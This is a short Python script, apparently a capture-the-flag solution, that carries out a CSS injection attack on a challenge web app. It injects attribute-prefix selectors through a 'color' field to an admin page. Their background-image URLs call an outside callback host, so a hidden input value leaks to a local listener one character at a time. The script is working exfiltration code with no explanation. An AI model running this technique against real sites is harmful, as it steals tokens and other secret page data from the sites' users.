from aiohttp import web, ClientSession
import asyncio
import string

async def css_injection(inject):
	curr = ""
	resp = asyncio.Queue()
	
	async def handler(request):
		await resp.put(request.path.strip("/"))
		return web.Response(body="")
	
	server = web.Server(handler)
	await asyncio.get_event_loop().create_server(server, "0.0.0.0", 8080)
	while True:
		await inject(curr, "https://css-injection.superstormer.repl.co/")
		c = await resp.get()
		curr += c
		print(curr)

async def inject(prefix, url):
	css = "red;}"
	for c in string.printable:
		if c not in "'<> \t\n\r\x0b\x0c":
			if c == "\\":
				c = "\\\\"
			css += f"input[value^='{prefix+c}']{{background-image:url({url}{c})}}"
	css += "a{"
	async with ClientSession() as session:
		await session.post(
			'http://chall.csivit.com:30256/admin',
			data={
			"url": "http://chall.csivit.com:30256/view",
			"color": css
			}
		)

asyncio.run(css_injection(inject))